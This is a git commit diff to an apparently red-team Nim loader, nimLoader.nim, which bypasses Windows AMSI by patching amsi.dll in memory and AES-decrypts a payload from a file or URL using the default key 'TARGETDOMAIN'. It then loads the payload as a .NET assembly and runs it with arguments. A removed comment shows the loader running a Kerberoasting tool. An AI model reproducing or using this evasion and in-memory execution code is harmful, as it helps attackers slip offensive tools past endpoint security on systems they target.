723893e8ff6718c540ba9a571e248376c88776b5
maninwire <31477337+maninwire@users.noreply.github.com>
2021-12-24 00:24:52 +0100

    Updated code

--- nimLoader.nim
+++ nimLoader.nim
@@ -1,5 +1,3 @@
-
-
 import strutils # basic string manipulation functionality
 import dynlib # for our AMSI bypass
 import byteutils # basic byte manipulation functionality 
@@ -13,8 +11,6 @@ import winim/clr except `[]`     # Common Language Runtime Support. Exclude []  
 import shlex #parameter splitting
 import std/httpclient
 
-# import nre # regex parsing. Returns "could not load: pcre64.dll" in runtime
-# import std/re # regex matching. Returns "could not load: pcre64.dll" in runtime 
 
 const iv: array[aes256.sizeBlock, byte]= [byte 55, 19, 19, 173, 190, 70, 130, 254, 26, 241, 14, 4, 213, 94, 108, 237]
 const envkey: string = "TARGETDOMAIN"
@@ -82,8 +78,6 @@ proc PatchAmsi(): bool =
         echo "[*] Running in x86 process"
         const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
     amsi = loadLib("amsi")
     if isNil(amsi):
         echo "[X] Failed to load amsi.dll"
@@ -106,16 +100,17 @@ proc PatchAmsi(): bool =
 
 
 
-
-
-
-
 when isMainModule:
 
     var decrypt: bool=false # option to decrypt
     var debug: bool=false # to enable/disable debug mode
     var inFile: string= "" # will hold input byte array file
-    var helpMsg: string="nimLoader.exe [-d] [-p:'parameters']  file.txt" # help msg
+    var helpMsg: string="""
+    nimLoader.exe [-d] [-D] [-k] [-p:'parameters']  <fileOrUrl.txt>
+    -d: Decrypt file or url
+    -k key: key for decryption. Defaults to TARGETDOMAIN
+    -D: Show debugging info
+    """ # help msg
     var parameters: string="" # parameters to the program to launch
     var passkeystr:string=envkey# default key to our constant
 
@@ -177,10 +172,7 @@ when isMainModule:
 
 
 
-      #var contents = readFile(inFile).string.strip() # read file contents
       contents = readFile(inFile).strip(leading = true, trailing = true)# read file contents
-      #var contents = readFile(inFile).stripLineEnd # read file contents
-      #contents=contents.stripLineEnd() 
     if debug:
       echo "Tool parameters are:" & parameters
 
@@ -189,23 +181,7 @@ when isMainModule:
         echo "Decrypting the file..."
       contents=decryptText(contents,passkeystr).strip(leading = true, trailing = true)
 
-
-    
-    # # THIS PROCESSING IS FOR CONVENIENCE AFTER USING CsharpToNimByteArray.ps1
-    # let parts=contents.split(" ") # our executable byte array has the var definition, see next line. Remove that
-    # # var buf: array[1, byte] = [byte 0x4D,0x...]
-    # let payloadStr=parts[6][0..^3] # our byte array is in the 6th position. Remove last 3 bytes
-    var payloadStr:string=contents
-    # REGEX OPTIONS GIVING RUNTIME ERROR "could not load: pcre64.dll"
-    # first nre try:
-    # let payloadStr=contents.find(re"^.*\[byte\ (.*)\].*$").get.captures[0]      
-    # second std/re try:
-    # var payloadStr: string=""
-    # var matches: array[1, string]
-    # if contents.find(re"^.*\[byte\ (.*)\].*$",matches)==0:
-    #   payloadStr=matches[0]
-    # else:
-    #   quit()
+    let payloadStr:string=contents
 
     if debug:
       echo "payloadStr start:"
@@ -222,12 +198,12 @@ when isMainModule:
       buf.add(hexToSeqByte(i))
 
 
-      # if debug:
-      #   echo "[*].NET versions"
-      #   for v in clrVersions():
-      #       # echo fmt"    \--- {v}"
-      #       echo v
-      #   echo "\n"
+    if debug:
+      echo "[*].NET versions"
+      for v in clrVersions():
+          # echo fmt"    \--- {v}"
+          echo v
+      echo "\n"
 
     if debug:
       echo "Loading buffer to assembly..."    
@@ -238,8 +214,6 @@ when isMainModule:
 
     if debug:
       echo "Loading parameter array..."    
-    #var arr = toCLRVariant(["kerberoast", "/format:hashcat"], VT_BSTR)
-
     var arr = toCLRVariant(shlex(parameters).words, VT_BSTR) # passing some args
     if debug:
       echo "Invoking assembly..."    
